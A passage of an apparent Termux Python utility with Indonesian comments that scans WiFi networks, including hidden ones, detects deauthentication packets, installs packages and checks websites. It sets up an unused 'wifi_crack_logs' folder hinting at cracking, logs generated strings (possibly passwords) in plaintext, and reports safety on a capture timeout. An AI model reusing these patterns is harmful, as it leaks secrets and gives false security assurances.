import os
import random
import string
import subprocess
import sys
import platform
import time
import json
import socket
import datetime
import threading
import datetime
from urllib.parse import urlparse

# Setup logging
LOG_DIR = "logtermux"
LOG_FILE = os.path.join(LOG_DIR, "logreport.txt")
CRACK_LOG_DIR = "wifi_crack_logs"
if not os.path.exists(CRACK_LOG_DIR):
    os.makedirs(CRACK_LOG_DIR)

def setup_logging():
    """Setup directory dan file log dengan path lengkap"""
    # Buat direktori log di storage external jika di Android
    if platform.system() == "Linux" and "ANDROID_ROOT" in os.environ:
        log_base_dir = "/sdcard/TermuxLogs"
    else:
        log_base_dir = LOG_DIR
    
    if not os.path.exists(log_base_dir):
        os.makedirs(log_base_dir)
    
    global LOG_FILE
    LOG_FILE = os.path.join(log_base_dir, "logreport.txt")
    
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(f"\n{'='*50}\n")
        f.write(f"LOG SESSION - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Log Path: {LOG_FILE}\n")
        f.write(f"{'='*50}\n")
    
    print(f"📝 Log system aktif: {LOG_FILE}")

def log_message(message):
    """Log message ke file"""
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{timestamp}] {message}\n"
    
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(log_entry)
    
    print(message)

# Cek dependencies
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    import speedtest
    SPEEDTEST_AVAILABLE = True
except ImportError:
    SPEEDTEST_AVAILABLE = False

def clear_screen():
    """Membersihkan layar"""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_header():
    """Menampilkan header program dengan info log"""
    print("=" * 60)
    print("           PROGRAM SHORTCUT UTILITIES - ADVANCED")
    print("=" * 60)
    print(f"Python {sys.version} - {platform.system()}")
    print(f"Log Path: {LOG_FILE}")
    print("=" * 60)

def auto_detect_and_install():
    """Fungsi otomatis deteksi dan install requirements"""
    print("\n=== AUTO DETECT & INSTALL ===")
    print("🔍 Mendeteksi sistem dan requirements...")
    
    system_info = platform.system()
    is_termux = system_info == "Linux" and "ANDROID_ROOT" in os.environ
    
    print(f"📱 System: {system_info} {'(Termux Android)' if is_termux else ''}")
    
    # Deteksi packages yang dibutuhkan
    required_packages = detect_required_packages(is_termux)
    
    if not required_packages:
        print("✅ Semua requirements sudah terpenuhi!")
        input("\nTekan Enter untuk kembali...")
        return
    
    print("\n📦 Packages yang akan diinstall:")
    for pkg_type, packages in required_packages.items():
        if packages:
            print(f"\n{pkg_type}:")
            for pkg in packages:
                print(f"  - {pkg}")
    
    confirm = input("\n🚀 Install semua requirements otomatis? (y/n): ").lower()
    
    if confirm == 'y':
        install_detected_packages(required_packages, is_termux)
    else:
        print("❌ Installation dibatalkan.")
    
    input("\nTekan Enter untuk kembali...")
    
def scan_hidden_wifi():
    """Scan untuk WiFi hidden networks"""
    print("\n🔍 SCAN HIDDEN WIFI NETWORKS")
    print("=" * 50)
    
    log_message("Starting hidden WiFi scan")
    
    methods = [
        {
            "name": "Advanced iwlist scan",
            "cmd": ["iwlist", "scanning"],
            "timeout": 20,
            "parse_func": parse_iwlist_hidden
        },
        {
            "name": "iw dev scan", 
            "cmd": ["iw", "dev", "wlan0", "scan"],
            "timeout": 15,
            "parse_func": parse_iw_scan
        }
    ]
    
    print("🔄 Mencari jaringan tersembunyi...")
    print("💡 Hidden WiFi biasanya tidak broadcast SSID")
    
    found_hidden = False
    
    for method in methods:
        try:
            print(f"\n🔄 Mencoba: {method['name']}")
            result = subprocess.run(
                method["cmd"],
                capture_output=True, 
                text=True, 
                timeout=method["timeout"]
            )
            
            if result.returncode == 0:
                hidden_networks = method["parse_func"](result.stdout)
                if hidden_networks:
                    found_hidden = True
                    break
            else:
                print(f"❌ {method['name']} gagal")
                
        except Exception as e:
            print(f"❌ {method['name']} error: {e}")
    
    if not found_hidden:
        print("\n📶 Tidak ditemukan jaringan tersembunyi")
        print("💡 Hidden networks sangat sulit dideteksi tanpa tools khusus")
    
    log_message("Hidden WiFi scan completed")

def parse_iwlist_hidden(output):
    """Parse iwlist output untuk hidden networks"""
    hidden_networks = []
    lines = output.split('\n')
    
    current_ssid = None
    current_bssid = None
    is_hidden = False
    
    for line in lines:
        line = line.strip()
        
        if 'ESSID:' in line:
            essid = line.split('ESSID:')[1].strip().strip('"')
            if essid and essid != '""':  # SSID terdeteksi
                current_ssid = essid
                is_hidden = False
            else:  # Hidden network
                current_ssid = "[HIDDEN]"
                is_hidden = True
        
        elif 'Address:' in line:
            current_bssid = line.split('Address:')[1].strip()
        
        elif 'Signal level=' in line and current_bssid:
            if is_hidden and current_ssid == "[HIDDEN]":
                hidden_networks.append({
                    'bssid': current_bssid,
                    'ssid': '[HIDDEN NETWORK]',
                    'signal': extract_signal_level(line)
                })
    
    if hidden_networks:
        print(f"\n🎯 Ditemukan {len(hidden_networks)} Hidden Networks:")
        print("=" * 50)
        for i, net in enumerate(hidden_networks, 1):
            print(f"{i}. BSSID: {net['bssid']}")
            print(f"   SSID: {net['ssid']}")
            print(f"   Signal: {net['signal']}")
            print()
        
        log_message(f"Found {len(hidden_networks)} hidden networks")
    
    return hidden_networks

def parse_iw_scan(output):
    """Parse iw dev scan output"""
    hidden_networks = []
    lines = output.split('\n')
    
    current_bssid = None
    ssid_found = False
    
    for line in lines:
        line = line.strip()
        
        if line.startswith('BSS '):
            parts = line.split()
            if len(parts) > 1:
                current_bssid = parts[1]
                ssid_found = False
        
        elif 'SSID:' in line:
            ssid_found = True
        
        elif 'signal:' in line and current_bssid and not ssid_found:
            # Ini kemungkinan hidden network
            signal = line.split('signal:')[1].strip().split()[0]
            hidden_networks.append({
                'bssid': current_bssid,
                'ssid': '[HIDDEN]',
                'signal': f"{signal} dBm"
            })
    
    return hidden_networks

def extract_signal_level(line):
    """Extract signal level dari iwlist output"""
    if 'Signal level=' in line:
        try:
            signal_part = line.split('Signal level=')[1].split()[0]
            return f"{signal_part} dBm"
        except:
            return "N/A"
    return "N/A"
    

def wifi_deauth_detector():
    """Deteksi potensi WiFi deauthentication attacks"""
    print("\n🚨 WIFI DEAUTHENTICATION DETECTOR")
    print("=" * 50)
    
    log_message("Starting deauth detection")
    
    print("🔍 Memindai potensi serangan WiFi...")
    print("💡 Fitur ini mendeteksi packet anomali")
    
    try:
        # Cek jika tcpdump tersedia
        result = subprocess.run(['tcpdump', '--version'], capture_output=True, text=True, timeout=10)
        if result.returncode != 0:
            print("❌ tcpdump tidak tersedia")
            print("💡 Install: pkg install tcpdump")
            return
        
        print("🔄 Menjalankan packet capture (10 detik)...")
        print("📡 Monitoring WiFi packets...")
        
        # Capture packets singkat
        result = subprocess.run([
            'timeout', '10', 'tcpdump', 
            '-i', 'any',
            '-c', '50',
            'type', 'mgt', 'subtype', 'deauth'
        ], capture_output=True, text=True, timeout=15)
        
        deauth_count = result.stdout.count('DeAuthentication')
        
        if deauth_count > 0:
            print(f"🚨 PERINGATAN: Ditemukan {deauth_count} deauth packets!")
            print("⚠️  Kemungkinan ada serangan WiFi di sekitar")
            log_message(f"DEAUTH DETECTED: {deauth_count} packets")
        else:
            print("✅ Tidak terdeteksi deauth packets")
            print("🛡️  Jaringan WiFi tampak aman")
            log_message("No deauth packets detected")
            
    except subprocess.TimeoutExpired:
        print("⏰ Timeout - monitoring selesai")
        print("✅ Tidak terdeteksi aktivitas mencurigakan")
    except Exception as e:
        print(f"❌ Error: {e}")
        log_message(f"Deauth detection error: {e}")

def detect_required_packages(is_termux):
    """Deteksi packages yang diperlukan"""
    required = {
        "Python Packages": [],
        "System Packages": [],
        "Missing Tools": []
    }
    
    # Cek Python packages
    python_packages = [
        ("requests", "requests"),
        ("speedtest-cli", "speedtest"),
        ("colorama", "colorama")
    ]
    
    for pip_name, import_name in python_packages:
        try:
            if pip_name == "speedtest-cli":
                __import__("speedtest")
            else:
                __import__(import_name)
        except ImportError:
            required["Python Packages"].append(pip_name)
    
    # Cek system packages untuk Termux
    if is_termux:
        system_packages = [
            ("termux-api", "termux-battery-status"),
            ("nmap", "nmap"),
            ("wireless-tools", "iwlist"),
            ("procps", "ps"),
            ("net-tools", "ifconfig")
        ]
        
        for pkg_name, cmd_name in system_packages:
            try:
                result = subprocess.run([cmd_name, "--version"] if cmd_name != "termux-battery-status" else [cmd_name], 
                                      capture_output=True, text=True, timeout=5)
                if result.returncode != 0:
                    required["System Packages"].append(pkg_name)
            except (subprocess.TimeoutExpired, FileNotFoundError):
                required["System Packages"].append(pkg_name)
    
    # Cek tools umum
    general_tools = ["ping", "curl", "wget"]
    for tool in general_tools:
        try:
            subprocess.run([tool, "--version"] if tool != "ping" else [tool, "-c", "1", "127.0.0.1"], 
                         capture_output=True, timeout=5)
        except (subprocess.TimeoutExpired, FileNotFoundError):
            required["Missing Tools"].append(tool)
    
    # Hapus kategori yang kosong
    return {k: v for k, v in required.items() if v}

def install_detected_packages(required_packages, is_termux):
    """Install packages yang terdeteksi"""
    print("\n🚀 Memulai installation...")
    log_message("Memulai auto-installation")
    
    total_installed = 0
    total_failed = 0
    
    # Install Python packages
    if "Python Packages" in required_packages:
        print("\n📦 Installing Python packages...")
        for package in required_packages["Python Packages"]:
            if install_python_package(package):
                total_installed += 1
            else:
                total_failed += 1
    
    # Install system packages untuk Termux
    if is_termux and "System Packages" in required_packages:
        print("\n🖥️  Installing system packages...")
        for package in required_packages["System Packages"]:
            if install_system_package(package):
                total_installed += 1
            else:
                total_failed += 1
    
    # Install general tools
    if "Missing Tools" in required_packages:
        print("\n🔧 Installing general tools...")
        for tool in required_packages["Missing Tools"]:
            if install_general_tool(tool, is_termux):
                total_installed += 1
            else:
                total_failed += 1
    
    # Summary
    print(f"\n📊 INSTALLATION SUMMARY:")
    print(f"✅ Berhasil: {total_installed}")
    print(f"❌ Gagal: {total_failed}")
    log_message(f"Installation summary: {total_installed} success, {total_failed} failed")
    
    if total_failed == 0:
        print("🎉 Semua packages berhasil diinstall!")
    else:
        print("⚠️ Beberapa packages gagal, coba install manual.")

def install_python_package(package_name):
    """Install Python package"""
    try:
        print(f"  Installing {package_name}...")
        log_message(f"Installing Python package: {package_name}")
        
        result = subprocess.run(
            [sys.executable, "-m", "pip", "install", package_name],
            capture_output=True, text=True, timeout=120
        )
        
        if result.returncode == 0:
            print(f"  ✅ {package_name} berhasil")
            log_message(f"✅ {package_name} success")
            
            # Update global status
            if package_name == "requests":
                global REQUESTS_AVAILABLE
                try:
                    import requests
                    REQUESTS_AVAILABLE = True
                except ImportError:
                    pass
            elif package_name == "speedtest-cli":
                global SPEEDTEST_AVAILABLE
                try:
                    import speedtest
                    SPEEDTEST_AVAILABLE = True
                except ImportError:
                    pass
            
            return True
        else:
            print(f"  ❌ {package_name} gagal: {result.stderr[:100]}")
            log_message(f"❌ {package_name} failed: {result.stderr}")
            return False
            
    except Exception as e:
        print(f"  ❌ {package_name} error: {e}")
        log_message(f"❌ {package_name} error: {e}")
        return False

def install_system_package(package_name):
    """Install system package untuk Termux"""
    try:
        print(f"  Installing {package_name}...")
        log_message(f"Installing system package: {package_name}")
        
        result = subprocess.run(
            ["pkg", "install", "-y", package_name],
            capture_output=True, text=True, timeout=120
        )
        
        if result.returncode == 0:
            print(f"  ✅ {package_name} berhasil")
            log_message(f"✅ {package_name} success")
            return True
        else:
            print(f"  ❌ {package_name} gagal")
            log_message(f"❌ {package_name} failed")
            return False
            
    except Exception as e:
        print(f"  ❌ {package_name} error: {e}")
        log_message(f"❌ {package_name} error: {e}")
        return False

def install_general_tool(tool_name, is_termux):
    """Install general tools"""
    try:
        print(f"  Installing {tool_name}...")
        log_message(f"Installing tool: {tool_name}")
        
        if is_termux:
            result = subprocess.run(
                ["pkg", "install", "-y", tool_name],
                capture_output=True, text=True, timeout=120
            )
        else:
            # Untuk non-Termux, skip karena butuh sudo
            print(f"  ⚠️  {tool_name} butuh manual install")
            return False
        
        if result.returncode == 0:
            print(f"  ✅ {tool_name} berhasil")
            log_message(f"✅ {tool_name} success")
            return True
        else:
            print(f"  ❌ {tool_name} gagal")
            log_message(f"❌ {tool_name} failed")
            return False
            
    except Exception as e:
        print(f"  ❌ {tool_name} error: {e}")
        log_message(f"❌ {tool_name} error: {e}")
        return False

def quick_system_check():
    """Quick check system status"""
    print("\n=== QUICK SYSTEM CHECK ===")
    
    checks = [
        ("Python 3.6+", lambda: sys.version_info >= (3, 6)),
        ("Requests", lambda: REQUESTS_AVAILABLE),
        ("Speedtest", lambda: SPEEDTEST_AVAILABLE),
        ("Termux API", check_termux_api),
        ("Network Tools", check_network_tools)
    ]
    
    all_ok = True
    for check_name, check_func in checks:
        try:
            result = check_func()
            status = "✅" if result else "❌"
            print(f"{status} {check_name}")
            if not result:
                all_ok = False
        except Exception as e:
            print(f"❌ {check_name} - Error: {e}")
            all_ok = False
    
    if all_ok:
        print("\n🎉 Semua sistem OK!")
    else:
        print("\n⚠️  Beberapa komponen perlu diinstall")
        print("💡 Gunakan 'Auto System Setup' untuk memperbaiki")

def check_termux_api():
    """Cek Termux API"""
    if platform.system() == "Linux" and "ANDROID_ROOT" in os.environ:
        try:
            result = subprocess.run(['termux-battery-status'], 
                                  capture_output=True, text=True, timeout=10)
            return result.returncode == 0
        except:
            return False
    return True  # Skip untuk non-Android

def install_termux_api_fix():
    """Install termux-api dan dependencies"""
    print("\n🔧 Installing Termux-API...")
    
    commands = [
        ["pkg", "update"],
        ["pkg", "install", "-y", "termux-api"],
        ["pkg", "install", "-y", "termux-tools"],
        ["pkg", "install", "-y", "wireless-tools"]
    ]
    
    for cmd in commands:
        try:
            print(f"Running: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            if result.returncode == 0:
                print(f"✅ {' '.join(cmd)} berhasil")
            else:
                print(f"❌ {' '.join(cmd)} gagal")
        except Exception as e:
            print(f"❌ Error: {e}")
    
    print("\n📋 Setelah install, lakukan:")
    print("1. Berikan izin Location ke Termux")
    print("2. Tutup dan buka kembali Termux")
    print("3. Coba scan WiFi lagi")

def show_wifi_scan_troubleshooting():
    """Tampilkan troubleshooting untuk WiFi scan"""
    print("\n" + "=" * 60)
    print("🔧 WIFI SCAN TROUBLESHOOTING")
    print("=" * 60)
    
    print("\n📋 PERIKSA HAL BERIKUT:")
    print("1. ✅ Pastikan WiFi Android aktif")
    print("2. ✅ Pastikan Location Services aktif")
    print("3. ✅ Berikan izin Location ke Termux")
    print("4. ✅ Install termux-api package")
    print("5. ✅ Install wireless-tools")
    print("6. ✅ Update Termux dan packages")
    
    print("\n🛠️  SOLUSI OTOMATIS:")
    
    solutions = [
        "Aktifkan Location: Settings → Location → ON",
        "Berikan izin Location ke Termux:",
        "  - Settings → Apps → Termux → Permissions → Location",
        "  - Atau buka Termux dan ketik: termux-location",
        "",
        "Auto install Termux-API:",
        "  Program akan mencoba install otomatis",
        "  Jika gagal, akan download APK manual",
        "",
        "Test permission location:",
        "  termux-location",
    ]
    
    for solution in solutions:
        print(f"  {solution}")
    
    print("\n💡 CATATAN:")
    print("- Android 10+ butuh Location permission untuk WiFi scan")
    print("- Beberapa device butuh GPS aktif untuk scan WiFi")
    print("- Termux-API perlu diinstall sebagai APK terpisah")
    
    log_message("WiFi scan troubleshooting displayed")
    
    # Tanya user apakah mau coba install requirements
    choice = input("\n🚀 Mau install Termux-API & wireless-tools sekarang? (y/n): ").lower()
    if choice == 'y':
        install_termux_api_fix()

def check_wifi_permissions():
    """Cek status permissions WiFi dan requirements"""
    print("\n🔍 CHECKING WIFI PERMISSIONS & REQUIREMENTS")
    print("=" * 50)
    
    log_message("Checking WiFi permissions")
    
    checks = [
        {
            "name": "Termux-API Package",
            "cmd": ["pkg", "list-installed"],
            "success_indicator": "termux-api",
            "fix_cmd": ["pkg", "install", "-y", "termux-api"]
        },
        {
            "name": "Wireless Tools", 
            "cmd": ["pkg", "list-installed"],
            "success_indicator": "wireless-tools",
            "fix_cmd": ["pkg", "install", "-y", "wireless-tools"]
        },
        {
            "name": "Location Permission",
            "cmd": ["termux-location"],
            "success_indicator": "latitude",
            "fix_manual": "Settings → Apps → Termux → Permissions → Location"
        },
        {
            "name": "WiFi Scan Capability",
            "cmd": ["termux-wifi-scaninfo"],
            "success_indicator": "ssid",
            "fix_manual": "Enable Location services and grant permission"
        },
        {
            "name": "Storage Permission", 
            "cmd": ["termux-setup-storage"],
            "success_indicator": "shared",
            "fix_manual": "Run: termux-setup-storage"
        }
    ]
    
    issues_found = 0
    
    for check in checks:
        try:
            print(f"\n🔍 Checking: {check['name']}...")
            
            if check['cmd'][0] == "termux-setup-storage":
                # Special handling untuk storage setup
                print("   ℹ️  Storage permission check - manual verification needed")
                continue
                
            result = subprocess.run(
                check["cmd"], 
                capture_output=True, 
                text=True, 
                timeout=10
            )
            
            if result.returncode == 0 and check["success_indicator"] in result.stdout:
                print(f"   ✅ {check['name']}: OK")
            else:
                print(f"   ❌ {check['name']}: ISSUE FOUND")
                issues_found += 1
                
                # Tampilkan solusi
                if 'fix_cmd' in check:
                    print(f"   💡 Fix: {' '.join(check['fix_cmd'])}")
                elif 'fix_manual' in check:
                    print(f"   💡 Fix: {check['fix_manual']}")
                    
        except subprocess.TimeoutExpired:
            print(f"   ⏰ {check['name']}: TIMEOUT")
            issues_found += 1
        except FileNotFoundError:
            print(f"   📛 {check['name']}: COMMAND NOT FOUND")
            issues_found += 1
        except Exception as e:
            print(f"   ❌ {check['name']}: ERROR - {e}")
            issues_found += 1
    
    # Summary
    print(f"\n📊 PERMISSION CHECK SUMMARY:")
    print(f"   Total Checks: {len(checks)}")
    print(f"   Issues Found: {issues_found}")
    
    if issues_found == 0:
        print("   🎉 All permissions are properly configured!")
    else:
        print(f"   ⚠️  Found {issues_found} issues that need attention")
        
        # Tanya user apakah mau auto-fix
        if issues_found > 0:
            fix_choice = input("\n🚀 Auto-fix detected issues? (y/n): ").lower()
            if fix_choice == 'y':
                auto_fix_permissions(checks)
    
    log_message(f"Permission check completed: {issues_found} issues found")

def auto_fix_permissions(checks):
    """Auto-fix permissions issues"""
    print("\n🔧 AUTO-FIXING PERMISSIONS...")
    
    fixed_count = 0
    
    for check in checks:
        try:
            # Test dulu apakah masih ada issue
            result = subprocess.run(
                check["cmd"], 
                capture_output=True, 
                text=True, 
                timeout=10
            )
            
            # Jika masih ada issue dan ada fix command
            if (result.returncode != 0 or check["success_indicator"] not in result.stdout) and 'fix_cmd' in check:
                print(f"\n🔄 Fixing: {check['name']}...")
                
                fix_result = subprocess.run(
                    check["fix_cmd"],
                    capture_output=True,
                    text=True,
                    timeout=60
                )
                
                if fix_result.returncode == 0:
                    print(f"   ✅ {check['name']}: FIXED")
                    fixed_count += 1
                else:
                    print(f"   ❌ {check['name']}: FAILED TO FIX")
                    
        except Exception as e:
            print(f"   ❌ {check['name']}: FIX ERROR - {e}")
    
    print(f"\n📊 FIX SUMMARY:")
    print(f"   Fixed: {fixed_count} issues")
    
    if fixed_count > 0:
        print("   🔄 Restart Termux untuk perubahan berlaku")
    
    log_message(f"Auto-fix completed: {fixed_count} issues fixed")
    
def check_network_tools():
    """Cek network tools"""
    try:
        subprocess.run(['ping', '-c', '1', '127.0.0.1'], 
                      capture_output=True, timeout=5)
        return True
    except:
        return False

def system_setup_requirements():
    """Menu system setup yang disederhanakan"""
    while True:
        clear_screen()
        print("\n=== SYSTEM SETUP & REQUIREMENTS ===")
        
        # Status cepat
        req_status = "✅" if REQUESTS_AVAILABLE else "❌"
        speed_status = "✅" if SPEEDTEST_AVAILABLE else "❌"
        
        print(f"\n📊 Quick Status:")
        print(f"  Requests: {req_status} | Speedtest: {speed_status}")
        
        print(f"\n💻 System: {platform.system()}")
        if platform.system() == "Linux" and "ANDROID_ROOT" in os.environ:
            print("  Environment: 📱 Termux Android")
        
        print("\n🔧 MENU SETUP:")
        print("1. 🚀 Auto Detect & Install (Recommended)")
        print("2. 📋 Quick System Check")
        print("3. 🏠 Kembali ke Menu Utama")
        
        choice = input("\nPilih opsi (1-3): ").strip()
        
        if choice == "1":
            auto_detect_and_install()
        elif choice == "2":
            quick_system_check()
        elif choice == "3":
            break
        else:
            print("❌ Pilihan tidak valid!")
        
        input("\nTekan Enter untuk lanjut...")
        
def show_detailed_system_info():
    """Menampilkan informasi sistem detail (simplified)"""
    print("\n=== SYSTEM INFORMATION ===")
    
    print(f"🕐 Waktu: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"🐍 Python: {sys.version.split()[0]}")
    print(f"💻 OS: {platform.system()} {platform.release()}")
    print(f"🏗️  Arch: {platform.architecture()[0]}")
    
    try:
        device_name = socket.gethostname()
        print(f"📱 Device: {device_name}")
    except:
        pass
    
    # IP Info
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        print(f"🌐 Local IP: {local_ip}")
    except:
        pass
    
    # Public IP
    if REQUESTS_AVAILABLE:
        try:
            public_ip = requests.get('https://api.ipify.org', timeout=5).text
            print(f"🌍 Public IP: {public_ip}")
        except:
            pass
    
    # Battery info untuk Android
    if platform.system() == "Linux" and "ANDROID_ROOT" in os.environ:
        try:
            result = subprocess.run(['termux-battery-status'], capture_output=True, text=True)
            if result.returncode == 0:
                battery = json.loads(result.stdout)
                print(f"🔋 Battery: {battery.get('percentage', 'N/A')}%")
                print(f"🔌 Status: {'Charging' if battery.get('plugged') != 'UNPLUGGED' else 'Battery'}")
        except:
            pass

# ... (Fungsi lainnya tetap sama: website_checker, random_string_generator, wifi_checker, dll)

def website_checker():
    """Program untuk mengecek status website"""
    if not REQUESTS_AVAILABLE:
        print("❌ Module 'requests' belum terinstall!")
        print("💡 Gunakan 'Auto System Setup' di menu 5")
        return
    
    print("\n=== WEBSITE CHECKER ===")
    url = input("Masukkan URL/domain website: ").strip()
    
    if not url:
        print("URL tidak boleh kosong!")
        return
    
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    log_message(f"Website check: {url}")
    
    try:
        print(f"\n🔍 Mengecek {url}...")
        response = requests.get(url, timeout=10)
        
        print(f"📊 Status: {response.status_code} {'✅ ONLINE' if response.status_code == 200 else '⚠️  MASALAH'}")
        print(f"⏱️  Response Time: {response.elapsed.total_seconds():.2f} detik")
        print(f"🖥️  Server: {response.headers.get('Server', 'Tidak diketahui')}")
        
        log_message(f"Website {url}: Status {response.status_code}")
        
    except requests.exceptions.RequestException as e:
        print(f"❌ ERROR: {e}")
        log_message(f"Website {url}: ERROR - {e}")

def random_string_generator():
    """Program untuk generate string acak"""
    while True:
        print("\n=== RANDOM STRING GENERATOR ===")
        
        try:
            length = int(input("Panjang string: "))
            if length <= 0:
                print("❌ Panjang harus lebih dari 0!")
                continue
        except ValueError:
            print("❌ Masukkan angka yang valid!")
            continue
        
        print("\n🎲 Pilihan karakter:")
        print("1. Huruf besar & kecil + angka")
        print("2. Huruf besar saja")
        print("3. Huruf kecil saja") 
        print("4. Angka saja")
        print("5. Dengan simbol")
        print("6. Custom karakter")
        
        choice = input("Pilih opsi (1-6): ").strip()
        
        if choice == "1":
            characters = string.ascii_letters + string.digits
        elif choice == "2":
            characters = string.ascii_uppercase
        elif choice == "3":
            characters = string.ascii_lowercase
        elif choice == "4":
            characters = string.digits
        elif choice == "5":
            characters = string.ascii_letters + string.digits + string.punctuation
        elif choice == "6":
            characters = input("Masukkan karakter custom: ")
            if not characters:
                print("❌ Karakter tidak boleh kosong!")
                continue
        else:
            print("❌ Pilihan tidak valid!")
            continue
        
        # Generate dan tampilkan
        result = ''.join(random.choice(characters) for _ in range(length))
        print(f"\n🔹 String Acak: {result}")
        log_message(f"Generated random string: {result}")
        
        # Tanya generate lagi
        again = input("\n🔄 Generate lagi dengan panjang sama? (y/n): ").lower()
        if again != 'y':
            break

def wifi_checker():
    """Program untuk mengecek jaringan WiFi"""
    print("\n=== WIFI CHECKER ===")
    
    if platform.system() == "Linux" and "ANDROID_ROOT" in os.environ:
        print("📱 Mode: Termux Android")
        termux_wifi_check()
    else:
        print("💻 Mode: Desktop")
        desktop_wifi_check()

def termux_wifi_check():
    """WiFi check untuk Termux dengan fitur tambahan"""
    while True:
        print("\n=== TERMUX WIFI CHECKER - ADVANCED ===")
        print("1. 📡 Scan WiFi Networks (Advanced)")
        print("2. 🔍 Scan Hidden WiFi Networks") 
        print("3. 📶 Current Connection Status")
        print("4. 🚨 Deauth Attack Detector")
        print("5. 🚀 Internet Speed Test")
        print("6. 🔧 Check Permissions & Troubleshoot")
        print("7. 🏠 Back to Main Menu")
        
        choice = input("Pilih opsi (1-7): ").strip()
        
        if choice == "1":
            scan_wifi_termux()  # Yang sudah dimodifikasi
        elif choice == "2":
            scan_hidden_wifi()  # Fungsi baru
        elif choice == "3":
            wifi_status_termux()
        elif choice == "4":
            wifi_deauth_detector()  # Fungsi baru
        elif choice == "5":
            speed_test()
        elif choice == "6":
            check_wifi_permissions()
        elif choice == "7":
            break
        else:
            print("❌ Pilihan tidak valid!")
        
        input("\nTekan Enter untuk lanjut...")
        
def scan_wifi_termux():
    """Scan WiFi di Termux dengan statistics lengkap"""
    print("\n📡 SCAN WIFI NETWORKS - ADVANCED")
    log_message("Starting advanced WiFi scan")
    
    methods = [
        {
            "name": "Termux WiFi Scan", 
            "cmd": ["termux-wifi-scaninfo"],
            "timeout": 15,
            "parse_func": parse_termux_wifi_scan_advanced
        },
        {
            "name": "NetworkManager", 
            "cmd": ["nmcli", "-t", "-f", "SSID,BSSID,SIGNAL,FREQ,SECURITY", "dev", "wifi"],
            "timeout": 10,
            "parse_func": parse_nmcli_wifi_advanced
        }
    ]
    
    success = False
    total_networks = 0
    
    for i, method in enumerate(methods, 1):
        try:
            print(f"\n🔄 Method {i}/{len(methods)}: {method['name']}...")
            
            result = subprocess.run(
                method["cmd"], 
                capture_output=True, 
                text=True, 
                timeout=method["timeout"]
            )
            
            if result.returncode == 0 and result.stdout.strip():
                print(f"✅ {method['name']} berhasil!")
                success = True
                networks_found = method["parse_func"](result.stdout)
                total_networks = len(networks_found)
                break
            else:
                print(f"❌ {method['name']} gagal (no output)")
                
        except Exception as e:
            print(f"❌ {method['name']} error: {str(e)[:50]}...")
    
    # Tampilkan statistics
    print(f"\n📊 SCAN STATISTICS:")
    print(f"   Total Networks: {total_networks}")
    
    # Signal range analysis
    if total_networks > 0:
        print(f"   Signal Range: -30dBm (Excellent) to -90dBm (Poor)")
        print(f"   Recommended: Connect to networks > -70dBm")
    
    if not success:
        show_wifi_scan_troubleshooting()

def parse_termux_wifi_scan_advanced(output):
    """Parse advanced WiFi scan dengan statistics"""
    try:
        networks = json.loads(output)
        if not networks:
            print("📶 Tidak ada jaringan WiFi yang terdeteksi")
            return []
        
        # Kategorikan berdasarkan signal strength
        excellent = []  # > -50 dBm
        good = []       # -50 to -65 dBm  
        fair = []       # -65 to -75 dBm
        poor = []       # < -75 dBm
        
        for net in networks:
            ssid = net.get('ssid', 'Hidden')
            bssid = net.get('bssid', 'N/A')
            rssi = net.get('rssi', 0)
            
            try:
                rssi_val = int(rssi)
                if rssi_val > -50:
                    excellent.append(net)
                elif rssi_val > -65:
                    good.append(net)
                elif rssi_val > -75:
                    fair.append(net)
                else:
                    poor.append(net)
            except:
                fair.append(net)  # Default jika parsing gagal
        
        # Tampilkan summary
        print(f"\n📶 FOUND {len(networks)} NETWORKS:")
        print("=" * 60)
        print(f"✅ Excellent ({len(excellent)}): > -50 dBm")
        print(f"🟢 Good ({len(good)}): -50 to -65 dBm") 
        print(f"🟡 Fair ({len(fair)}): -65 to -75 dBm")
        print(f"🔴 Poor ({len(poor)}): < -75 dBm")
        print("=" * 60)
        
        # Tampilkan networks (max 20)
        display_networks = excellent + good + fair + poor
        display_count = min(20, len(display_networks))
        
        print(f"\n📋 TOP {display_count} NETWORKS:")
        for i, net in enumerate(display_networks[:display_count], 1):
            ssid = net.get('ssid', 'Hidden')
            bssid = net.get('bssid', 'N/A')[:17]  # Shorten BSSID
            rssi = net.get('rssi', 'N/A')
            freq = net.get('frequency_mhz', 'N/A')
            
            # Signal quality indicator
            try:
                rssi_val = int(rssi)
                if rssi_val > -50:
                    signal_icon = "💪"
                elif rssi_val > -65:
                    signal_icon = "👍"  
                elif rssi_val > -75:
                    signal_icon = "👌"
                else:
                    signal_icon = "👎"
            except:
                signal_icon = "📶"
            
            print(f"{i:2d}. {signal_icon} {ssid}")
            print(f"     📡 {bssid} | 📶 {rssi} dBm | 📊 {freq} MHz")
            print()
        
        if len(networks) > display_count:
            print(f"... and {len(networks) - display_count} more networks")
            
        log_message(f"WiFi scan found {len(networks)} networks")
        return networks
        
    except json.JSONDecodeError:
        print("❌ Gagal parse hasil scan")
        return []

def parse_nmcli_wifi_advanced(output):
    """Parse nmcli dengan statistics"""
    if not output.strip():
        return []
        
    lines = output.strip().split('\n')
    networks = []
    
    for line in lines:
        parts = line.split(':')
        if len(parts) >= 5:
            network = {
                'ssid': parts[0] if parts[0] else 'Hidden',
                'bssid': parts[1] if len(parts) > 1 else 'N/A',
                'signal': parts[2] if len(parts) > 2 else 'N/A',
                'frequency': parts[3] if len(parts) > 3 else 'N/A',
                'security': parts[4] if len(parts) > 4 else 'N/A'
            }
            networks.append(network)
    
    print(f"\n📶 FOUND {len(networks)} NETWORKS (nmcli):")
    print("=" * 50)
    
    for i, net in enumerate(networks[:15], 1):
        print(f"{i:2d}. {net['ssid']}")
        print(f"     Signal: {net['signal']}% | Security: {net['security']}")
        print()
    
    return networks
    
def wifi_status_termux():
    """Status WiFi di Termux"""
    try:
        result = subprocess.run(['termux-wifi-connectioninfo'], 
                              capture_output=True, text=True, timeout=10)
        
        if result.returncode == 0:
